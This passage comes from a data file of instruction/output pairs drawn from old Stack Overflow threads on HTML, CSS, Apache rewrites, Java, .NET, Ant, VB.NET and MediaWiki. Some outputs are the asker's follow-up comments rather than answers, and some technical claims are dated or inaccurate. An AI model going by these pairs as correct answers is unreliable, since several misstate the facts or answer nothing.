receive focus. \nDisabled controls are skipped in tabbing navigation. \nDisabled controls cannot be successful.\n\n\nit also says\n\nHow disabled elements are rendered depends on the user agent. For example, some user agents \"gray out\" disabled menu items, button labels, etc. In this example, the INPUT element is disabled. Therefore, it cannot receive user input nor will its value be submitted with the form.\n\nWhile this specific case isn't specified, my reading of this says that the actual rendering of a 'selected' 'disabled' element is left up to the browser.  As long as the user cannot select it then it's working as standard.  It does say that a script can act upon the element, so it is possible for Javascript to set a disabled option as selected (or disable a selected option).  This isn't contrary to the standards, but on form submission, that option's value couldn't be the selected value.  The select list would (I assume) have to have an empty value in this case."}
{"instruction": "In my specific example, I'm dealing with a drop-down, e.g.:\n<select name=\"foo\" id=\"bar\">\n    <option disabled=\"disabled\" selected=\"selected\">Select an item:</option>\n    <option>an item</option>\n    <option>another item</option>\n</select>\n\nOf course, that's pretty nonsensical, but I'm wondering whether any strict behaviour is defined. Opera effectively rejects the 'selected' attribute and selects the next item in the list. All other browsers appear to allow it, and it remains selected.\nUpdate: To clarify, I'm specifically interested in the initial selection. I'm dealing with one of those 'Select an item:'-type drop-downs, in which case the first option is really a label, and an action occurs onchange(). This is fairly well 'progressively enhanced', in that a submit button is present, and only removed via javascript. If the \"select...\" option were removed, whatever then were to become the first item would not be selectable. Are we just ruling out 'onchange' drop downs altogether, or should the \"select...\" option be selectable, just with no effect?", "output": "According to the HTML 4.01 Specification, disabled is a standard attribute for the option element, but behavior is probably indeterminate based on the standard (read over the information on the select element and the options elements. Here is a portion I think may shed light on Opera's reasons for their implementation:\n\nWhen set, the disabled attribute has the following effects on an element:\n    * Disabled controls do not receive focus.\n    * Disabled controls are skipped in tabbing navigation.\n    * Disabled controls cannot be successful.  \n\nSo, it is very likely that this is just one of those things where the spec is vague enough to allow for both interpretations. This is the kind of idiosyncrasy that makes programming for the web so fun and rewarding. :P"}
{"instruction": "I want to implement an \"automatic update\" system for  a windows application. \nRight now I'm semi-manually creating an \"appcast\" which my program checks, and notifies the user that a new version is available. (I'm using\n NSIS for my installers).\nIs there software that I can use that will handle the \"automatic\" part of the updates, perhaps similar to  Sparkle on the mac? Any issues/pitfalls that I should be aware of?", "output": "Just came here from an answer to my own question on the same subject - I mention one other updating solution in my question.  It uses a stub loader, and an xml file to point to the latest executable."}
{"instruction": "Im trying to redirect requests for a wildcard domain to a sub-directory.\nie. something.blah.domain.com --> blah.domain.com/something\nI dont know how to get the subdomain name to use in the rewrite rule.\nFinal Solution:\nRewriteCond %{HTTP_HOST} !^blah\\.domain\\.com\nRewriteCond %{HTTP_HOST} ^([^.]+)\nRewriteRule ^(.*) /%1/$1 [L]\n\nOr as pointed out by pilif\nRewriteCond %{HTTP_HOST} ^([^.]+)\\.media\\.xnet\\.tk$", "output": "@Sam\nyour RewriteCond line is wrong. The expansion of the variable is triggered with %, not $.\nRewriteCond %{HTTP_HOST} ^([^\\.]+)\\.media\\.xnet\\.tk$\n            ^\n\nthat should do the trick"}
{"instruction": "I always thought Java was pass-by-reference; however I've seen a couple of blog posts (for example, this blog) that claim it's not. I don't think I understand the distinction they're making. \nWhat is the explanation?", "output": "I always think of it as \"pass by copy\". It is a copy of the value be it primitive or reference. If it is a primitive it is a copy of the bits that are the value and if it is an Object it is a copy of the reference.\npublic class PassByCopy{\n    public static void changeName(Dog d){\n        d.name = \"Fido\";\n    }\n    public static void main(String[] args){\n        Dog d = new Dog(\"Maxx\");\n        System.out.println(\"name= \"+ d.name);\n        changeName(d);\n        System.out.println(\"name= \"+ d.name);\n    }\n}\nclass Dog{\n    public String name;\n    public Dog(String s){\n        this.name = s;\n    }\n}\n\noutput of java PassByCopy:\n\nname= Maxx\n  name= Fido\n\nPrimitive wrapper classes and Strings are immutable so any example using those types will not work the same as other types/objects."}
{"instruction": "In my specific example, I'm dealing with a drop-down, e.g.:\n<select name=\"foo\" id=\"bar\">\n    <option disabled=\"disabled\" selected=\"selected\">Select an item:</option>\n    <option>an item</option>\n    <option>another item</option>\n</select>\n\nOf course, that's pretty nonsensical, but I'm wondering whether any strict behaviour is defined. Opera effectively rejects the 'selected' attribute and selects the next item in the list. All other browsers appear to allow it, and it remains selected.\nUpdate: To clarify, I'm specifically interested in the initial selection. I'm dealing with one of those 'Select an item:'-type drop-downs, in which case the first option is really a label, and an action occurs onchange(). This is fairly well 'progressively enhanced', in that a submit button is present, and only removed via javascript. If the \"select...\" option were removed, whatever then were to become the first item would not be selectable. Are we just ruling out 'onchange' drop downs altogether, or should the \"select...\" option be selectable, just with no effect?", "output": "In reply to the update in the question, I would say that the 'label' option should be selectable but either make it do nothing on submission or via JavaScript, don't allow the form to be submitted without a value being selected (assuming it's a required field).\nFrom a usablilty point of view I'd suggest doing both, that way all bases are covered."}
{"instruction": "I always thought Java was pass-by-reference; however I've seen a couple of blog posts (for example, this blog) that claim it's not. I don't think I understand the distinction they're making. \nWhat is the explanation?", "output": "I have created a thread devoted to these kind of questions for any programming languages here.\nJava is also mentioned. Here is the short summary:\n\nJava passes it parameters by value\n\"by value\" is the only way in java to pass a parameter to a method\nusing methods from the object given as parameter will alter the\nobject as the references point to\nthe original objects. (if that\nmethod itself alters some values)"}
{"instruction": "I have a basic cs-major understanding of multi-threading but have never had to do anything beyond simple timers in an application. Does anyone know of a good resource that will give me a tour how to work with multi-threaded applications, explaining the basics and maybe posing some of the more difficult stuff?", "output": "This is a great free resource by Joseph Albahari. Threading in C#"}
{"instruction": "I have a basic cs-major understanding of multi-threading but have never had to do anything beyond simple timers in an application. Does anyone know of a good resource that will give me a tour how to work with multi-threaded applications, explaining the basics and maybe posing some of the more difficult stuff?", "output": "There are 4 basic ways to synchronize threads in .Net:\n\nBackgroundWorker control\nWaitHandles\nCallback functions\npolling an ASyncResult object\n\nGenerally you want to start at the top of that list and work down.  That means first look and see if a backgroundworker control is appropriate to the situation.  However, it pretty much assumes windows forms and that you're only spawning one new thread.\nSo next try waithandles.  Waithandles are good for coordinating several threads together.   You can kick them all off and wait for them all to finish, or if you want to keep a certain number active you keep waiting for just one and spawning the next when it finishes.  Or maybe you know one thread will finish much sooner, so you can wait for it to finish, do a little bit of work, and then wait for the rest to finish.\nWaithandles might seem like a bit much if, say, you're only spawning one additional thread and you don't want to block until it's finished.  Then you might use a callback, so that the function you designate will be called as soon as the thread completes.\nFinally, if and only if for some reason none of the above will work you can fall back to polling.\nI can think of 5 different ways to get a new thread in .Net, also roughly in order:\n\nOS created, normally as the result of winforms event (including the BackgoundWorker).\nObj.Begin___()/End____().  Certain CLR classes already have these asynchronous methods defined for you, and obviously you want to use them when they're available.\nThreadPool.QueueUserWorkItem().  Use this most of the time to create your own threads.\nDelegate.BeginInvoke()/EndInvoke().  You can wrap any method this way.\nThread.Start().  You could do it this way, but I read something recently (don't have the link now) that if QueueUserWorkItem won't work the delegate method is probably better."}
{"instruction": "I have a basic cs-major understanding of multi-threading but have never had to do anything beyond simple timers in an application. Does anyone know of a good resource that will give me a tour how to work with multi-threaded applications, explaining the basics and maybe posing some of the more difficult stuff?", "output": "Two great articles:\n\nWhat Every Dev Must Know About Multithreaded Apps\nUnderstand the Impact of Low-Lock Techniques in Multithreaded Apps\n\nAlthough this article isn't exactly what you are looking for specifically, it will hopefully be of assistance generally (i.e. it is related, and a very good read):\n\nThe Free Lunch Is Over: A Fundamental Turn Toward Concurrency in Software"}
{"instruction": "I have a basic cs-major understanding of multi-threading but have never had to do anything beyond simple timers in an application. Does anyone know of a good resource that will give me a tour how to work with multi-threaded applications, explaining the basics and maybe posing some of the more difficult stuff?", "output": "A good web-resource to learn about multi-threading in .NET:\n\nHTML version.\nPrintable version\nFurther resources - (including examples)"}
{"instruction": "In my specific example, I'm dealing with a drop-down, e.g.:\n<select name=\"foo\" id=\"bar\">\n    <option disabled=\"disabled\" selected=\"selected\">Select an item:</option>\n    <option>an item</option>\n    <option>another item</option>\n</select>\n\nOf course, that's pretty nonsensical, but I'm wondering whether any strict behaviour is defined. Opera effectively rejects the 'selected' attribute and selects the next item in the list. All other browsers appear to allow it, and it remains selected.\nUpdate: To clarify, I'm specifically interested in the initial selection. I'm dealing with one of those 'Select an item:'-type drop-downs, in which case the first option is really a label, and an action occurs onchange(). This is fairly well 'progressively enhanced', in that a submit button is present, and only removed via javascript. If the \"select...\" option were removed, whatever then were to become the first item would not be selectable. Are we just ruling out 'onchange' drop downs altogether, or should the \"select...\" option be selectable, just with no effect?", "output": "Are we just ruling out 'onchange' drop\n  downs altogether, or should the\n  \"select...\" option be selectable, just\n  with no effect?\n\n\"onchange\" drop-downs are frowned upon by more standards-obsessed types.\nI would typically do some client-side validation. \"Please select an item from the drop down\" kind of thing. i.e.\n\nshould the \"select...\" option be selectable, just with no effect?\n\nSo I just said \"Yes\" to your A or B question. :/ Sorry!"}
{"instruction": "We have an Apache ANT script to build our application, then check in the resulting JAR file into version control (VSS in this case).  However, now we have a change that requires us to build 2 JAR files for this project, then check both into VSS.\nThe current target that checks the original JAR file into VSS discovers the name of the JAR file through some property.  Is there an easy way to \"generalize\" this target so that I can reuse it to check in a JAR file with any name?  In a normal language this would obviously call for a function parameter but, to my knowledge, there really isn't an equivalent concept in ANT.", "output": "It is generally considered a bad idea to version control your binaries and I do not recommend doing so. But if you absolutely have to, you can use antcall combined with param to pass parameters and call a target.\n<antcall target=\"reusable\">\n    <param name=\"some.variable\" value=\"var1\"/>\n</antcall>\n\n<target name=\"reusable\">\n    <!-- Do something with ${some.variable} -->\n</target>\n\nYou can find more information about the antcall task here."}
{"instruction": "We have an Apache ANT script to build our application, then check in the resulting JAR file into version control (VSS in this case).  However, now we have a change that requires us to build 2 JAR files for this project, then check both into VSS.\nThe current target that checks the original JAR file into VSS discovers the name of the JAR file through some property.  Is there an easy way to \"generalize\" this target so that I can reuse it to check in a JAR file with any name?  In a normal language this would obviously call for a function parameter but, to my knowledge, there really isn't an equivalent concept in ANT.", "output": "Also check out the subant task, which lets you call the same target on multiple build files:\n<project name=\"subant\" default=\"subant1\">\n    <property name=\"build.dir\" value=\"subant.build\"/>\n    <target name=\"subant1\">\n        <subant target=\"\">\n            <property name=\"build.dir\" value=\"subant1.build\"/>\n            <property name=\"not.overloaded\" value=\"not.overloaded\"/>\n            <fileset dir=\".\" includes=\"*/build.xml\"/>\n        </subant>\n    </target>\n</project>"}
{"instruction": "Is it necessary to set large objects to null when implementing a Dispose() method?", "output": "If a class has a Dispose method the best practice is to call it. the reason\nbehind that is that Dispose runs when called, whereas setting the object to\nnull simply adds a entry to the Finalize queue in GC, and we cannot\ndetermine when GC will run.\nThere is no performance benefit in implementing the Dispose method on types that use only managed resources (such as arrays) because they are automatically reclaimed by the garbage collector. Use the Dispose method primarily on managed objects that use native resources and on COM objects that are exposed to the .NET Framework. Managed objects that use native resources (such as the FileStream class) implement the IDisposable interface.\nAn elegant means of inoking Dispose that have adopted is using the \"using\" construct. For those of you who may not be familiar with the construct, it provide a means to implicity invoke Dispose() on an instance that implements IDisposable even if an exception is thrown durring the operation. The following is an example of the using construct: \nusing(DisposableClass dc = new DisposableClass()) \n{ \n   dc.PerformActionOnUmanagedResources(); \n   dc.PerformAnotherActionOnUmanagedResources(); \n}\n\nIn the previous example, if an exception was thrown in the PerformActionOnUmanagedResources() method, although the PerformAnotherActionOnUmanagedResources() method would not be processed, the using block will still implicity invoke the Dispose method on dc ensuring the realese of any unmanaged resources."}
{"instruction": "Is it necessary to set large objects to null when implementing a Dispose() method?", "output": "The purpose of a dispose method is to release all resources associated with your class, and the parent's class by calling the base class dispose method. Have a read of this link, it should make things a little clearer:\nhttp://msdn.microsoft.com/en-us/library/fs2xkftw.aspx"}
{"instruction": "Is it necessary to set large objects to null when implementing a Dispose() method?", "output": "what do you mean by \"large object\"?\nYou should at least call Dispose() on any member implementing IDisposable, though."}
{"instruction": "Is it necessary to set large objects to null when implementing a Dispose() method?", "output": "Not usually.\nThe garbage collector looks for rooted objects, and circular dependencies don't prevent collection if neither object is rooted.\nThere is a caveat: if object A has a reference to object B, and object B is being disposed, you may want to clean up that relationship or else you could end up with a leak. The most common place this surfaces is in event handlers (the reference from A->B is one that B controls, because it subscribed to an event on A). In this case, if A is still rooted, B cannot be collected even though it's been disposed."}
{"instruction": "We have an Apache ANT script to build our application, then check in the resulting JAR file into version control (VSS in this case).  However, now we have a change that requires us to build 2 JAR files for this project, then check both into VSS.\nThe current target that checks the original JAR file into VSS discovers the name of the JAR file through some property.  Is there an easy way to \"generalize\" this target so that I can reuse it to check in a JAR file with any name?  In a normal language this would obviously call for a function parameter but, to my knowledge, there really isn't an equivalent concept in ANT.", "output": "Take a look at Ant macros.  They allow you to define reusable \"routines\" for Ant builds.  You can find an example here (item 15)."}
{"instruction": "Is it necessary to set large objects to null when implementing a Dispose() method?", "output": "It isn't necessary as others have pointed out, but it is good practice and helps with debugging.\nOnce an object has finished with a pointer it is using then setting it to null helps prevent reuse of that object later (you'll get an null reference exception).\nThe same logic applies to setting member pointers to null in C++ destructors once you have deleted them.  There is no need to do it, but it helps with troubleshooting later."}
{"instruction": "I have a 200+ case statement in Classic ASP which is getting out of control. It sets 5 variables, based on which case is selected. Address, Phone, Name etc. Just sets the variables and nothing else in each case.\nDatabases or files are not an option for this application.\nComing from the Perl world I would use a hash to store this info.", "output": "Getting out of control? I think it's already out of control!\nCan you not categorise the cases into 'x' general areas and split down into helper routines?"}
{"instruction": "What options exist for accessing different databases from C++?\nPut differently, what alternatives are there to ADO?\nWhat are the pros and cons?", "output": "Microsoft ODBC.\nThe MFC ODBC classes such as CDatabase.\nOleDB (via COM).\nAnd you can always go through the per-RDBMS native libraries (for example, the SQL Server native library)\nDAO (don't).\n3rd party ORM providers.\n\nI would recommend going through ODBC or OleDB by default. Native libraries really restrict you, DAO is no fun, there aren't a lot of great 3rd-party ORM for C++/Windows."}
{"instruction": "I'm pretty new to my company (2 weeks) and we're starting a new platform for our system using .NET 3.5 Team Foundation from DotNetNuke. Our \"architect\" is suggesting we use one class project. Of course, I chime back with a \"3-tier\" architecture (Business, Data, Web class projects). \nIs there any disadvantages to using this architecture? Pro's would be separation of code from data, keeping class objects away from your code, etc.", "output": "The only disadvantage is complexity but really how hard is it to add some domain objects and bind to a list of them as opposed to using a dataset.  You don't even have to create three seperate projects, you can just create 3 seperate folders within the web app and give each one a namespace like, YourCompany.YourApp.Domain, YourCompany.YourApp.Data, etc.  \nThe big advantage is having a more flexible solution.  If you start writing your app as a data centric application, strongly coupling your web forms pages to datasets, you are going to end up doing a lot more work later migrating to a more domain centeric model as your business logic grows in complexity.  \nMaybe in the short term you focus on a simple solution by creating very simple domain objects and populating them from datasets, then you can add business logic to them as needed and build out a more sophisticated ORM as needed, or use nhibernate."}
{"instruction": "I can't be sure if my code is sucking, or if it's just that the browsers haven't caught up with the spec yet.\nMy goal is to simulate list markers using generated content, so as to get e.g. continuation of the counters from list to list in pure CSS. So the HTML is like this:\n<ol>\n <li>The<li>\n <li>quick</li>\n <li>brown</li>\n</ol>\n<ol>\n <li>fox</li>\n <li>jumped</li>\n <li>over</li>\n</ol>\n\nand the CSS, which I think is correct according to the spec, is like this:\nhtml { counter-reset: myCounter; }\nli { counter-increment: myCounter; }\nli:before { content: counter(myCounter)\". \"; display: marker; width: 5em; text-align: right; marker-offset: 1em; }\n\nBut this doesn't seem to generate markers, in either FF3, Chrome, or IE8 beta 2, and if I recall correctly not Opera either (although I've since uninstalled Opera).\nSo, does anyone know if markers are supposed to work? Quirksmode.org isn't being its usual helpful self in this regard :(.", "output": "Apparently marker was introduced as a value in CSS 2 but did not make it to CSS 2.1 because of lacking browser support.\nI suppose that didn\u2019t help its popularity \u2026\nSource: http://de.selfhtml.org/css/eigenschaften/positionierung.htm#display (German)"}
{"instruction": "I have a 200+ case statement in Classic ASP which is getting out of control. It sets 5 variables, based on which case is selected. Address, Phone, Name etc. Just sets the variables and nothing else in each case.\nDatabases or files are not an option for this application.\nComing from the Perl world I would use a hash to store this info.", "output": "Brian, the classic ASP equivalent of a Perl hash is the Scripting.Dictionary object."}
{"instruction": "I can't be sure if my code is sucking, or if it's just that the browsers haven't caught up with the spec yet.\nMy goal is to simulate list markers using generated content, so as to get e.g. continuation of the counters from list to list in pure CSS. So the HTML is like this:\n<ol>\n <li>The<li>\n <li>quick</li>\n <li>brown</li>\n</ol>\n<ol>\n <li>fox</li>\n <li>jumped</li>\n <li>over</li>\n</ol>\n\nand the CSS, which I think is correct according to the spec, is like this:\nhtml { counter-reset: myCounter; }\nli { counter-increment: myCounter; }\nli:before { content: counter(myCounter)\". \"; display: marker; width: 5em; text-align: right; marker-offset: 1em; }\n\nBut this doesn't seem to generate markers, in either FF3, Chrome, or IE8 beta 2, and if I recall correctly not Opera either (although I've since uninstalled Opera).\nSo, does anyone know if markers are supposed to work? Quirksmode.org isn't being its usual helpful self in this regard :(.", "output": "Oh ouch, did not know that :-|. That probably seals its case, then. Because mostly I was under the assumption that such a basic CSS2 property should definitely be supported in modern browsers, but if it didn't make it into CSS 2.1, then it makes a lot more sense that it isn't.\nFor future reference, it doesn't show up in the Mozilla Development Center, so presumably Firefox doesn't support it at all.\nAlso for future reference, I got my original example to work with inline-block instead:\nli:before\n{\n    content: counter(myCounter)\". \";\n    display: inline-block;\n    width: 2em;\n    padding-right: 0.3em;\n    text-align: right;\n}"}
{"instruction": "I have a site I made really fast that uses floats to display different sections of content. The floated content and the content that has an additional margin both appear fine in FF/IE, but on safari one of the divs is completely hidden. I've tried switching to padding and position:relative, but nothing has worked for me. If I take out the code to display it to the right it shows up again but under the floated content.\nThe main section of css that seems to be causing the problem is:\n#settings{\n    float:left;\n}\n\n#right_content{\n    margin-top:20px;\n    margin-left:440px;\n    width:400px;\n}\n\nThis gives me the same result whether I specify a size to the #settings div or not. Any ideas would be appreciated.\nThe site is available at: http://frickinsweet.com/tools/Theme.mvc.aspx to see the source code.", "output": "Have you tried floating the #right_content div to the right?\n#right_content{\n  float: right;\n  margin-top: 20px;\n  width: 400px;\n}"}
{"instruction": "I have a site I made really fast that uses floats to display different sections of content. The floated content and the content that has an additional margin both appear fine in FF/IE, but on safari one of the divs is completely hidden. I've tried switching to padding and position:relative, but nothing has worked for me. If I take out the code to display it to the right it shows up again but under the floated content.\nThe main section of css that seems to be causing the problem is:\n#settings{\n    float:left;\n}\n\n#right_content{\n    margin-top:20px;\n    margin-left:440px;\n    width:400px;\n}\n\nThis gives me the same result whether I specify a size to the #settings div or not. Any ideas would be appreciated.\nThe site is available at: http://frickinsweet.com/tools/Theme.mvc.aspx to see the source code.", "output": "Sorry I should have mentioned that as well. I tried floating that content right and additionally tried floating it left and setting the position with the thinking that both divs would start out at left:0 where setting the margin of the right would move it over.\nThanks"}
{"instruction": "I have a site I made really fast that uses floats to display different sections of content. The floated content and the content that has an additional margin both appear fine in FF/IE, but on safari one of the divs is completely hidden. I've tried switching to padding and position:relative, but nothing has worked for me. If I take out the code to display it to the right it shows up again but under the floated content.\nThe main section of css that seems to be causing the problem is:\n#settings{\n    float:left;\n}\n\n#right_content{\n    margin-top:20px;\n    margin-left:440px;\n    width:400px;\n}\n\nThis gives me the same result whether I specify a size to the #settings div or not. Any ideas would be appreciated.\nThe site is available at: http://frickinsweet.com/tools/Theme.mvc.aspx to see the source code.", "output": "A few things you should fix beforehand:\n\nYour <style> tag is in <body>, when it belongs in <head>\nYou have a typo \"realtive\" in one of your inline styles:\n<a href=\"http://feeds.feedburner.com/ryanlanciaux\" style=\"position:realtive; top:-6px;\">\n\n\nTry to get your page to validate; this should make debugging the actual problems far easier."}
{"instruction": "I have a site I made really fast that uses floats to display different sections of content. The floated content and the content that has an additional margin both appear fine in FF/IE, but on safari one of the divs is completely hidden. I've tried switching to padding and position:relative, but nothing has worked for me. If I take out the code to display it to the right it shows up again but under the floated content.\nThe main section of css that seems to be causing the problem is:\n#settings{\n    float:left;\n}\n\n#right_content{\n    margin-top:20px;\n    margin-left:440px;\n    width:400px;\n}\n\nThis gives me the same result whether I specify a size to the #settings div or not. Any ideas would be appreciated.\nThe site is available at: http://frickinsweet.com/tools/Theme.mvc.aspx to see the source code.", "output": "I believe the error lies in the mark up that the color picker is generating.  I saved the page and removed that code for the color picker and it renders fine in IE/FF/SF."}
{"instruction": "After lots of attempts and search I have never found a satisfactory way to do it with CSS2.\nA simple way to accomplish it is to wrap it into a handy <table> as shown in the sample below. Do you know how to do it avoiding table layouts and also avoiding quirky tricks?\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\">\n<html>\n<head>\n        <style type=\"text/css\">\n            table \n            {\n                margin:0px auto 0 auto;\n            }\n        </style>\n</head>\n    <body>\n        <table>\n            <tr>\n                <td>test<br/>test</td>\n            </tr>\n        </table>\n    </body>\n<html>\n\n\nWhat I want to know is how to do it without a fixed width and also being a block.", "output": "In FF3, you can:\n<div style=\"display: table; margin: 0px auto 0 auto;\">test<br>test</div>\n\nThis has the advantage of using whatever element makes most semantic sense (replace the div with something better, if appropriate), but the disadvantage that it fails in IE (grr...)\nOther than that, without setting the width, your best bet is to use javascript to precisely position the left-hand edge. I'm not sure if you'd class that as a 'quirky trick', though.\nIt really depends on what you want to do, of course. Given your simple test case, a div with text-align: center would have exactly the same effect."}
{"instruction": "I wish I were a CSS smarty .... \nHow can you place a div container in the lower left-hand corner of the web page; taking into account the users scroll-position?", "output": "To keep the users scroll position you may need to use javascript for this."}
{"instruction": "What options exist for accessing different databases from C++?\nPut differently, what alternatives are there to ADO?\nWhat are the pros and cons?", "output": "One thing - if speed is important and your code doesn't need to be portable, then it may be worth it to use the native libraries. \nI don't know much about SQL Server, but I do know that the Oracle OCI calls are faster than using ODBC. But, they tie you to Oracle's version of SQL. It would make sense for SQL Server to be the same way."}
{"instruction": "I wish I were a CSS smarty .... \nHow can you place a div container in the lower left-hand corner of the web page; taking into account the users scroll-position?", "output": "The attributes...\nposition: fixed;\nleft: 0;\nbottom: 0;\n\n...should do the job in every browser except IE. If supporting IE users is important for your site, you need to add some ugly Javascript."}
{"instruction": "I wish I were a CSS smarty .... \nHow can you place a div container in the lower left-hand corner of the web page; taking into account the users scroll-position?", "output": "I think you could use the same code as the footer, but change the width of the div to fixed or not 100%. I'm not sure what you mean by the users scroll-position.\nSo essentially, you will do:\n#lowerleft {\n\n  position:fixed;\n  bottom:0;\n  left:0;\n  width:<fixed px>;\n  height:<fixed px>;\n}\n\nreference for fixed footer is here."}
{"instruction": "I wish I were a CSS smarty .... \nHow can you place a div container in the lower left-hand corner of the web page; taking into account the users scroll-position?", "output": "Fixed positioning gets the job done outside of IE. What are you using this fixed div for?"}
{"instruction": "This has been driving me crazy for a few days.  Why doesn't the following work?\n\n    Dim arr(3, 3) As Integer\n\n    For y As Integer = 0 To arr.GetLength(0) - 1\n        For x As Integer = 0 To arr.GetLength(y) - 1\n            arr(y, x) = y + x\n        Next\n    Next\n\n\nAlso, what if the array looked like this instead?\n{ {1, 2, 3},\n  {4, 5, 6, 7, 8, 9, 9, 9},\n  {5, 4, 3, 2}\n}", "output": "arr.GetLength(y)\nshould be\narr.GetLength(1)"}
{"instruction": "This has been driving me crazy for a few days.  Why doesn't the following work?\n\n    Dim arr(3, 3) As Integer\n\n    For y As Integer = 0 To arr.GetLength(0) - 1\n        For x As Integer = 0 To arr.GetLength(y) - 1\n            arr(y, x) = y + x\n        Next\n    Next\n\n\nAlso, what if the array looked like this instead?\n{ {1, 2, 3},\n  {4, 5, 6, 7, 8, 9, 9, 9},\n  {5, 4, 3, 2}\n}", "output": "Because there is no '2' or '3' dimension.  Should be .GetLength(1) instead of .GetLength(y)\nAlso:  in VB.Net array declarations work a little differently.  The subscript you specify in the declaration is the last index, not the number of items created like with C# or C++.   But the array is still 0-indexed like C# or C++, instead of 1-indexed like VB6.  That means that if you move to VB.Net from a different language your array instincts are probably wrong, no matter which language it is.  In VB.Net, Dim arr(3,3) As Integer actually creates a 4x4 array."}
{"instruction": "I created a few mediawiki custom tags, using the guide found here\nhttp://www.mediawiki.org/wiki/Manual:Tag_extensions\nI will post my code below, but the problem is after it hits the first custom tag in the page, it calls it, and prints the response, but does not get anything that comes after it in the wikitext. It seems it just stops parsing the page.\nAny Ideas?\nif ( defined( 'MW_SUPPORTS_PARSERFIRSTCALLINIT' ) ) {\n     $wgHooks['ParserFirstCallInit'][] = 'tagregister';\n} else { // Otherwise do things the old fashioned way\n     $wgExtensionFunctions[] = 'tagregister';\n}\n\nfunction tagregister(){\n  global $wgParser;\n  $wgParser->setHook('tag1','tag1func');\n  $wgParser->setHook('tag2','tag2func');\n  return true;\n}\n\nfunction tag1func($input,$params)\n{\n  return \"It called me\";\n}\n\nfunction tag2func($input,$params)\n{\n  return \"It called me -- 2\";\n}\nUpdate: @George Mauer --  I have seen that as well, but this does not stop the page from rendering, just the Mediawiki engine from parsing the rest of the wikitext. Its as if hitting the custom function is signalling mediawiki that processing is done. I am in the process of diving into the rabbit hole but was hoping someone else has seen this behaviour.", "output": "Never used Mediawiki but that sort of problem in my experience is indicative of a php error that occurred but was suppressed either with the @ operator or because php error output to screen is turned off.\nI hate to resort to this debugging method but when absolutely and utterly frustrated in php I will just start putting echo statements every few lines (always with a marker so I remember to remove them later), to figure out exactly where the error is coming from.  Eventually you'll get to the bottom of the rabbit hole and figure out exactly what the problematic line of code is."}
{"instruction": "I'm building a webapp that contains an IFrame in design mode so my user's can \"tart\" their content up and paste in content to be displayed on their page.  Like the WYSIWYG editor on most blog engines or forums.\nI'm trying to think of all potential security holes I need to plug, one of which is a user pasting in Javascript:\n<script type=\"text/javascript\">\n\n// Do some nasty stuff\n\n</script>\n\nNow I know I can strip this out at the server end, before saving it and/or serving it back, but I'm worried about the possibility of someone being able to paste some script in and run it there and then, without even sending it back to the server for processing.\nAm I worrying over nothing?\nAny advice would be great, couldn't find much searching Google.\nAnthony", "output": "As Jason said, I would focus more on cleaning the data on the server side. You don't really have any real control on the client side unless you're using Silverlight / Flex and even then you'd need to check the server.\nThat said, Here are some tips from \"A List Apart\" you may find helpful regarding server side data cleaning.\nhttp://www.alistapart.com/articles/secureyourcode"}
{"instruction": "I'm building a webapp that contains an IFrame in design mode so my user's can \"tart\" their content up and paste in content to be displayed on their page.  Like the WYSIWYG editor on most blog engines or forums.\nI'm trying to think of all potential security holes I need to plug, one of which is a user pasting in Javascript:\n<script type=\"text/javascript\">\n\n// Do some nasty stuff\n\n</script>\n\nNow I know I can strip this out at the server end, before saving it and/or serving it back, but I'm worried about the possibility of someone being able to paste some script in and run it there and then, without even sending it back to the server for processing.\nAm I worrying over nothing?\nAny advice would be great, couldn't find much searching Google.\nAnthony", "output": "...I'm worried about the possibility of someone being able to paste some script in and run it there and then, without even sending it back to the server for processing.  \nAm I worrying over nothing?\n\nFirefox has a plug-in called Greasemonkey that allows users to arbitrarily run JavaScript against any page that loads into their browser, and there is nothing you can do about it. Firebug allows you to modify web pages as well as run arbitrary JavaScript.\nAFAIK, you really only need to worry once it gets to your server, and then potentially hits other users."}
{"instruction": "How do you disable autocomplete in the major browsers for a specific input (or form field)?", "output": "On a related, or actually, on the completely opposite note - if you're the user of the aforementioned form and want to re-enable the autocomplete functionality, use the 'remember password' bookmarklet from this bookmarklets page. It removes all 'autocomplete=\"off\"' attributes from all forms on the page. Keep fighting the good fight!"}
{"instruction": "How do you disable autocomplete in the major browsers for a specific input (or form field)?", "output": "Why would you make your user's life less convenient?\n\"Passwords / credit card data / etc. should not be saved\" is a bad argument: with autocomplete on, browsers in Mac OS X store such values in an encrypted database with per-application permissions. Conversely, what's the realistic effect of autocomplete=off? The user is going to write it in an unencrypted text file, or better yet, on a post-it note attached to the screen.\nGood thing there's bookmarklets like the one Antti mentioned, and patches to make the engine ignore the attribute altogether.\nSeriously, I urge you to reconsider using this attribute. It does not benefit anyone."}
{"instruction": "This has been driving me crazy for a few days.  Why doesn't the following work?\n\n    Dim arr(3, 3) As Integer\n\n    For y As Integer = 0 To arr.GetLength(0) - 1\n        For x As Integer = 0 To arr.GetLength(y) - 1\n            arr(y, x) = y + x\n        Next\n    Next\n\n\nAlso, what if the array looked like this instead?\n{ {1, 2, 3},\n  {4, 5, 6, 7, 8, 9, 9, 9},\n  {5, 4, 3, 2}\n}", "output": "Well what if I had an array that looked like this\n{ {1, 2, 3},\n  {4, 5, 6, 7, 8, 9, 9, 9},\n  {5, 4, 3, 2}\n}\n\nHow would GetLength(1) still know the length of each row?\n\nBasically what I want is.... a way to find the number of elements in any given row."}
{"instruction": "I'm planning to develop an ASP.NET server control to provide asynchronous username availability validation for new user registrations.  The control will allow a developer to point it at a \"username\" TextBox and it will provide an indication of whether or not the username is available.  Like this example, but without the clunky UpdatePanel.\nOne design decision that's giving me headaches is whether to inherit from ScriptControl or BaseValidator.\nBy implementing it as a ScriptControl, I can make the client side portion easier to deal with and easily localize it with a resx.\nHowever, I want to make sure that the validator functions properly with respect to Page.IsValid.  The only way I know to do this is to override BaseValidator and implement EvaluateIsValid().\nSo, my question is, how would you suggest structuring this control?  Is inheriting from BaseValidator the best (only) way to get the validator part right, or can I do that in some other way?", "output": "You should be able to do both if you implement the IScriptControl interface while also deriving from BaseValidator:\npublic class YourControl : IScriptControl, BaseValidator\n\nTo implement the IScriptControl interface means your control will also have to have the GetScriptReferences and GetScriptDescriptors methods."}
